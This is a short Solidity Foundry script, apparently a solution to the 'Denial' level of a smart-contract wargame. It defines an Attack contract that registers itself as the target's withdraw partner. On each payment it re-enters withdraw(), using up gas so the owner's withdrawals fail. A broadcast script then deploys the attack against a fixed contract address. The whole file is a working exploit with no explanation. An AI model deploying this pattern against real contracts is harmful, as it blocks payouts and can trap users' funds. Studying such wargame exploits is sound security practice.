pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Denial} from "../src/Denial.sol";

contract Attack {
    Denial public target;

    constructor(address payable _denial) {
        target = Denial(_denial);
        target.setWithdrawPartner(address(this));
    }

    receive() external payable {
        payable(address(target)).call{value: msg.value}("");
        target.withdraw();
    }
}

contract DenialScript is Script {
    address private constant DENIAL_ADDRESS = 0xc2F0CbB656cf8382ba0a19DE38fa6D47498B2174;

    function run() public {
        vm.startBroadcast();
        new Attack(payable(DENIAL_ADDRESS));
        vm.stopBroadcast();
    }
}
